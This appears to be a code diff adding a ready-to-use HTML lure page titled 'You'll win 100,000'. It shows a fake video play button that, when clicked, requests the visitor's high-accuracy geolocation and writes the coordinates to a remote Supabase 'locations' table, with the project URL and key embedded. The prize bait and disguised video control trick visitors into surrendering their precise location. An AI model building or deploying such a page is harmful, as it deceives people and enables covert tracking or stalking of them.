@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>You’ll win 100,000</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: #111;
+            font-family: Arial, sans-serif;
+            color: white;
+
+            display: flex;
+            justify-content: center;
+            align-items: center;
+
+            padding: 20px;
+        }
+
+        .page {
+            width: 100%;
+            max-width: 600px;
+            text-align: center;
+        }
+
+        h1 {
+            margin: 0 0 10px;
+            font-size: 28px;
+        }
+
+        .subtitle {
+            color: #ddd;
+            margin-bottom: 20px;
+        }
+
+        /* مربع الصورة */
+
+        .video-preview {
+            position: relative;
+
+            width: 100%;
+            aspect-ratio: 16 / 9;
+
+            background-image: url("image.jpg");
+            background-size: cover;
+            background-position: center;
+
+            border-radius: 12px;
+            overflow: hidden;
+
+            display: flex;
+            justify-content: center;
+            align-items: center;
+
+            cursor: pointer;
+        }
+
+        /* طبقة خفيفة فوق الصورة */
+
+        .video-preview::before {
+            content: "";
+            position: absolute;
+            inset: 0;
+
+            background: rgba(0, 0, 0, 0.20);
+        }
+
+        /* زر التشغيل */
+
+        .play-button {
+            position: relative;
+            z-index: 2;
+
+            width: 78px;
+            height: 78px;
+
+            border-radius: 50%;
+
+            background: white;
+            color: #111;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            font-size: 36px;
+
+            padding-left: 5px;
+
+            transition: 0.2s;
+        }
+
+        .video-preview:hover .play-button {
+            transform: scale(1.08);
+        }
+
+        .video-label {
+            position: absolute;
+
+            z-index: 2;
+
+            bottom: 15px;
+            left: 0;
+            right: 0;
+
+            color: white;
+
+            font-size: 16px;
+
+            text-shadow: 0 1px 4px #000;
+        }
+
+        /* رسالة توضيحية */
+
+        .notice {
+            margin-top: 18px;
+
+            padding: 14px;
+
+            background: #222;
+
+            border-radius: 10px;
+
+            color: #ddd;
+
+            line-height: 1.7;
+
+            font-size: 14px;
+        }
+
+        /* النتيجة */
+
+        #result {
+            margin-top: 20px;
+
+            min-height: 30px;
+
+            line-height: 2;
+        }
+
+        .success {
+            color: #20d866;
+            font-weight: bold;
+        }
+
+        .error {
+            color: #ff5555;
+            font-weight: bold;
+        }
+
+        .loading {
+            color: #ddd;
+        }
+    </style>
+</head>
+
+
+<body>
+
+<div class="page">
+
+    <h1>
+        You’ll win 100,000
+    </h1>
+
+    <div class="subtitle">
+        Go register your name to be among the winners.
+    </div>
+
+
+    <!-- الصورة + زر التشغيل -->
+
+    <div
+        class="video-preview"
+        id="videoButton"
+        role="button"
+        tabindex="0"
+        aria-label="Continue and share location"
+    >
+
+        <div class="play-button">
+            ▶
+        </div>
+
+        <div class="video-label">
+            Click to continue
+        </div>
+
+    </div>
+
+
+    <!-- توضيح للمستخدم -->
+
+    <div class="notice">
+        To continue, click the play button.
+        Your browser will ask for permission to share your location.
+    </div>
+
+
+    <!-- نتيجة العملية -->
+
+    <div id="result"></div>
+
+</div>
+
+
+<!-- Supabase -->
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+
+<script>
+
+    /* =====================================
+       بيانات Supabase
+       ===================================== */
+
+    const SUPABASE_URL =
+        "https://vsztpvsicsmxjhsvqzbv.supabase.co";
+
+    const SUPABASE_PUBLISHABLE_KEY =
+        "sb_publishable_N2P-l8nE7GaChsD5lrxb4w_nr8K5UrM";
+
+
+    /* =====================================
+       إنشاء اتصال Supabase
+       ===================================== */
+
+    const supabaseClient =
+        window.supabase.createClient(
+            SUPABASE_URL,
+            SUPABASE_PUBLISHABLE_KEY
+        );
+
+
+    /* =====================================
+       العناصر
+       ===================================== */
+
+    const videoButton =
+        document.getElementById("videoButton");
+
+    const result =
+        document.getElementById("result");
+
+
+    let processing = false;
+
+
+    /* =====================================
+       الضغط على زر ▶️
+       ===================================== */
+
+    videoButton.addEventListener(
+        "click",
+        requestLocation
+    );
+
+
+    /* =====================================
+       دعم Enter و Space
+       ===================================== */
+
+    videoButton.addEventListener(
+        "keydown",
+        function(event) {
+
+            if (
+                event.key === "Enter" ||
+                event.key === " "
+            ) {
+
+                event.preventDefault();
+
+                requestLocation();
+            }
+
+        }
+    );
+
+
+    /* =====================================
+       طلب الموقع
+       ===================================== */
+
+    function requestLocation() {
+
+        if (processing) {
+            return;
+        }
+
+
+        if (!navigator.geolocation) {
+
+            result.innerHTML =
+                '<span class="error">' +
+                'Your browser does not support location.' +
+                '</span>';
+
+            return;
+        }
+
+
+        processing = true;
+
+
+        result.innerHTML =
+            '<span class="loading">' +
+            'Requesting location permission...' +
+            '</span>';
+
+
+        navigator.geolocation.getCurrentPosition(
+
+            locationSuccess,
+
+            locationError,
+
+            {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 0
+            }
+
+        );
+    }
+
+
+    /* =====================================
+       نجاح الحصول على الموقع
+       ===================================== */
+
+    async function locationSuccess(position) {
+
+        const latitude =
+            position.coords.latitude;
+
+        const longitude =
+            position.coords.longitude;
+
+        const accuracy =
+            position.coords.accuracy;
+
+
+        result.innerHTML =
+            '<span class="loading">' +
+            'Registering your location...' +
+            '</span>';
+
+
+        try {
+
+            const { error } =
+                await supabaseClient
+                    .from("locations")
+                    .insert({
+
+                        latitude: latitude,
+
+                        longitude: longitude,
+
+                        accuracy: accuracy
+
+                    });
+
+
+            if (error) {
+
+                console.error(
+                    "Supabase error:",
+                    error
+                );
+
+
+                result.innerHTML =
+                    '<span class="error">' +
+                    'Registration failed.' +
+                    '</span>';
+
+                processing = false;
+
+                return;
+            }
+
+
+            result.innerHTML =
+                '<span class="success">' +
+                'You have been successfully registered ✅' +
+                '</span>';
+
+
+        }
+
+        catch (error) {
+
+            console.error(error);
+
+
+            result.innerHTML =
+                '<span class="error">' +
+                'Registration failed.' +
+                '</span>';
+
+        }
+
+
+        processing = false;
+    }
+
+
+    /* =====================================
+       أخطاء تحديد الموقع
+       ===================================== */
+
+    function locationError(error) {
+
+        console.error(
+            "Location error:",
+            error
+        );
+
+
+        if (error.code === 1) {
+
+            result.innerHTML =
+                '<span class="error">' +
+                'Location permission was not granted.' +
+                '</span>';
+
+        }
+
+        else if (error.code === 2) {
+
+            result.innerHTML =
+                '<span class="error">' +
+                'Unable to determine your location.' +
+                '</span>';
+
+        }
+
+        else if (error.code === 3) {
+
+            result.innerHTML =
+                '<span class="error">' +
+                'Location request timed out.' +
+                '</span>';
+
+        }
+
+        else {
+
+            result.innerHTML =
+                '<span class="error">' +
+                'Unable to get your location.' +
+                '</span>';
+
+        }
+
+
+        processing = false;
+    }
+
+</script>
+
+</body>
+
+</html>
